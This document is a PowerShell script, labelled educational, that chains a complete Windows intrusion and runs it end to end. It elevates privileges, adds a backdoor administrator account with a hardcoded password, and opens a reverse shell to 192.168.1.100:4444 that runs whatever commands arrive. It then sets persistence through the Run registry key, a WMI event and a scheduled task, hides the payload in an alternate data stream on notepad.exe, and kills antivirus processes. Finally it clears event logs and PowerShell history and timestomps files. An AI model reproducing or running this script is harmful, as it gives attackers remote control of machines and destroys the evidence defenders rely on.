# Refined Privilege Escalation Script for Educational Purposes

# Step 1: Escalate Privileges using RunAs
function Escalate-Privileges {
    try {
        Start-Process powershell -Verb RunAs -ErrorAction Stop
    } catch {
        Write-Error "Failed to escalate privileges: $_"
    }
}

# Step 2: Create Immutable User Profile (Administrator Rights Required)
function Create-Immutable-User {
    param (
        [string]$username = "secureuser",
        [string]$password = "SuperSecurePassword123!"
    )
    try {
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
        New-LocalUser -Name $username -Password $securePassword -FullName "Secure User" -Description "Immutable Profile User" -ErrorAction Stop
        Add-LocalGroupMember -Group "Administrators" -Member $username -ErrorAction Stop
        
        # Set user profile as read-only (immutable)
        $profilePath = "C:\Users\$username"
        if (Test-Path $profilePath) {
            icacls $profilePath /deny $username:(W) -ErrorAction Stop
        } else {
            Write-Warning "User profile path not found: $profilePath"
        }
    } catch {
        Write-Error "Failed to create immutable user: $_"
    }
}

# Step 3: Switch to the newly created user account
function Switch-User {
    param (
        [string]$username = "secureuser",
        [string]$password = "SuperSecurePassword123!"
    )
    try {
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
        Start-Process "powershell" -Credential $credential -ArgumentList "-NoExit" -Wait -ErrorAction Stop
    } catch {
        Write-Error "Failed to switch user: $_"
    }
}

# Step 4: Set up a Reverse Shell for Persistent Access
function Open-Reverse-Shell {
    param (
        [string]$ip = "192.168.1.100",
        [int]$port = 4444
    )
    try {
        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | % { 0 }
        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
            $sendback = (iex $data 2>&1 | Out-String)
            $sendback2  = $sendback + "PS " + (pwd).Path + "> "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {
        Write-Error "Failed to open reverse shell: $_"
    }
}

# Step 5: Add Persistence via Registry
function Add-Registry-Persistence {
    param (
        [string]$scriptPath = "C:\Windows\Temp\reverse_shell.ps1"
    )
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name "ReverseShellPersistence" -Value $scriptPath -ErrorAction Stop
    } catch {
        Write-Error "Failed to add registry persistence: $_"
    }
}

# Step 6: Add WMI Persistence (runs on system startup)
function Add-WMI-Persistence {
    param (
        [string]$scriptPath = "C:\Windows\Temp\reverse_shell.ps1"
    )
    try {
        $triggerQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_OperatingSystem'"
        Register-WmiEvent -Query $triggerQuery -Action { & $scriptPath } -SourceIdentifier "WMI-Persistence" -ErrorAction Stop
    } catch {
        Write-Error "Failed to add WMI persistence: $_"
    }
}

# Step 7: Hide script in Alternate Data Stream (ADS)
function Hide-Script-ADS {
    param (
        [string]$scriptPath = "C:\Windows\Temp\reverse_shell.ps1",
        [string]$adsFile = "C:\Windows\system32\notepad.exe:reverse_shell.ps1"
    )
    try {
        Get-Content $scriptPath | Set-Content $adsFile -ErrorAction Stop
    } catch {
        Write-Error "Failed to hide script in ADS: $_"
    }
}

# Step 8: Add Randomized Scheduled Task for Persistence
function Add-Randomized-ScheduledTask {
    param (
        [string]$scriptPath = "C:\Windows\Temp\reverse_shell.ps1"
    )
    try {
        $taskName = "Task_" + -join ((65..90) + (97..122) | Get-Random -Count 8 | % { [char]$_ })
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File $scriptPath"
        $trigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -ErrorAction Stop
    } catch {
        Write-Error "Failed to add randomized scheduled task: $_"
    }
}

# Step 9: Bypass AV/EDR by Disabling Security Processes
function Bypass-AV-EDR {
    param (
        [string[]]$AVProcesses = @("MsMpEng", "avgsvc", "avp", "mcshield")
    )
    try {
        foreach ($process in $AVProcesses) {
            if (Get-Process -Name $process -ErrorAction SilentlyContinue) {
                Stop-Process -Name $process -Force -ErrorAction Stop
            }
        }
    } catch {
        Write-Error "Failed to bypass AV/EDR: $_"
    }
}

# Step 10: Delete PowerShell History and Logs
function Delete-PowerShell-History {
    try {
        # Clear PowerShell History
        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction Stop

        # Clear Event Logs
        wevtutil cl "Microsoft-Windows-PowerShell/Operational"
        wevtutil cl "Security"
        wevtutil cl "System"
        wevtutil cl "Application"
    } catch {
        Write-Error "Failed to delete PowerShell history and logs: $_"
    }
}

# Step 11: Timestomping to Hide Changes
function TimeStomp {
    param (
        [string]$filePath = "C:\Windows\Temp\reverse_shell.ps1",
        [datetime]$timestamp = (Get-Date "1/1/2000")
    )
    try {
        (Get-Item $filePath).LastAccessTime = $timestamp
        (Get-Item $filePath).LastWriteTime = $timestamp
        (Get-Item $filePath).CreationTime = $timestamp
    } catch {
        Write-Error "Failed to timestomp file: $_"
    }
}

# Main function to run all steps
function Main {
    $username = "secureuser"
    $password = "SuperSecurePassword123!"
    $reverseShellIP = "192.168.1.100"
    $reverseShellPort = 4444
    $scriptPath = "C:\Windows\Temp\reverse_shell.ps1"
    $adsFile = "C:\Windows\system32\notepad.exe:reverse_shell.ps1"
    $timestamp = Get-Date "1/1/2000"
    $AVProcesses = @("MsMpEng", "avgsvc", "avp", "mcshield")

    Escalate-Privileges
    Create-Immutable-User -username $username -password $password
    Switch-User -username $username -password $password
    Open-Reverse-Shell -ip $reverseShellIP -port $reverseShellPort
    Add-Registry-Persistence -scriptPath $scriptPath
    Add-WMI-Persistence -scriptPath $scriptPath
    Add-Randomized-ScheduledTask -scriptPath $scriptPath
    Hide-Script-ADS -scriptPath $scriptPath -adsFile $adsFile
    Bypass-AV-EDR -AVProcesses $AVProcesses
    Delete-PowerShell-History
    TimeStomp -filePath $scriptPath -timestamp $timestamp
}

# Run the main function
Main
